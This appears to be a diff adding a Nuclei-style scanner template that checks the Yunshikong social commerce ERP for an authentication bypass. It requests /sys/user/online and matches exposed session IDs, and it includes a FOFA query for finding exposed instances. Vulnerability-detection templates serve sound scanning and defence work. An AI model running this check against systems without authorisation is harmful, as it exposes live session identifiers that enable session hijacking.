@@ -1,0 +1,32 @@
+id: yunshikongERP-user_online-Authentication-bypass
+
+info:
+  name: 云时空社会化商业ERP系统 user/online 身份认证绕过
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: title="云时空社会化商业ERP系统"
+
+  tags: Authentication Bypass
+
+http:
+  - raw:
+      - |
+        GET /sys/user/online HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"sessionid":'
+          - '"tomcat":'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
